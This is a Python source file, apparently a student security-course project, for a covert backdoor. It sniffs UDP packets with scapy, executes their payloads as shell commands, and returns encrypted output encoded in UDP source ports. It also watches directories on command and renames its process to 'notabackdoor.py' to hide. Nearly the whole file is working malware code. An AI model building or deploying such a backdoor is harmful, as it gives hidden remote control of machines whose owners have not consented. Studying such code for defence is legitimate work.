##################################################################################
##  SOURCE FILE:    AesEncryption.py
##
##  AUTHOR:         Geoff Dabu
##
##  PROGRAM:        Backdoor program which receives commands, executes them and
##                  returns the output to the client. The process title is also
##                  changed to disguise itself.
##
##  FUNCTIONS:      executeShellCommand(string)
##					parsePacket(packet)
##                  main()
##
##  DATE:           October 17, 2015
##
##################################################################################
import sys, os, argparse, socket, subprocess, logging, time, subprocess, setproctitle, threading, pyinotify
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from AesEncryption import *

##################################################################################
##  FUNCTION
##
##  Name:           executeShellCommand
##  Parameters:     string - a shell command
##  Return Values:  string - the output of the shell command
##  Description:    executes a shell command and returns the output
##################################################################################
def executeShellCommand(command):

    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    outputString = "\nOUTPUT:\n" + output.stdout.read() + output.stderr.read()
    return outputString




def onChange(ev):
    cmd = ['/bin/echo', 'File', ev.pathname, 'changed']
    subprocess.Popen(cmd).communicate()
    # with open("/root/Documents/C8505/Final Project/pyinotify/3.png", 'r') as f:
    #     data = f.read()
    # f.close()
    # send_to_client(data)
    print "sent changed data"
    return


wm = pyinotify.WatchManager()
mask = pyinotify.IN_CLOSE_WRITE
# wdd = wm.add_watch('/tmp', mask, rec=True)

# Event Handler. We will fill it later
class EventHandler(pyinotify.ProcessEvent):

    def process_IN_CLOSE_WRITE(self, event):
        print event.pathname
        print "file modified"

def watch_file(directory):
    # print "watch:", directory 
    # wm = pyinotify.WatchManager()
    # wm.add_watch(directory, pyinotify.IN_CLOSE_WRITE, onChange)
    # notifier = pyinotify.Notifier(wm)
    # notifier.loop()

    handler = EventHandler()
    notifier = pyinotify.Notifier(wm, handler)
    wdd = wm.add_watch(directory, mask, rec=True)
    notifier.loop()




##################################################################################
##  FUNCTION
##
##  Name:           parsePacket
##  Parameters:     packet - a packet which is passed in through sniff()
##  Return Values:  n/a
##  Description:    receives a packet, decrypts the payload for a command,
##                  runs the command, and sends back a packet with a decrypted
##                  output result.
##################################################################################
def parsePacket(receivedPacket):

    command = (receivedPacket['Raw'].load)


    if receivedPacket["UDP"].dport == 22:
        directory = (receivedPacket['Raw'].load)
        print directory
        t = threading.Thread(name="watchfile_threading", target=watch_file, args=[directory])
        t.start()


    elif receivedPacket["UDP"].dport == 80:

        print "Excuting: " + command
        output = executeShellCommand(command)
        print "Output: " + output
        output = encrypt(output)
        print output

        output_dec = [ord(ch) for ch in output]
        print len(output_dec)
        print output_dec

        for srcport in output_dec:
            returnPacket = IP(src=receivedPacket["IP"].dst, dst=receivedPacket["IP"].src)/UDP(dport=receivedPacket['UDP'].sport,sport=srcport)/encrypt(output)
            send(returnPacket)
            # time.sleep(0.5)

        returnPacket = IP(src=receivedPacket["IP"].dst, dst=receivedPacket["IP"].src)/UDP(dport=receivedPacket['UDP'].sport,sport=128)/encrypt(output)
        send(returnPacket)

##################################################################################
##  FUNCTION
##
##  Name:           main
##  Parameters:     n/a
##  Return Values:  n/a
##  Description:    Changes the process name of this program, and listens for
##                  packets that are directed to specific ports.
##################################################################################
def main():

    setproctitle.setproctitle("notabackdoor.py")
    sniff(filter="udp and (dst port 80 or dst port 22) and (src port 8000)", prn=parsePacket)

if __name__ == '__main__':
    main()
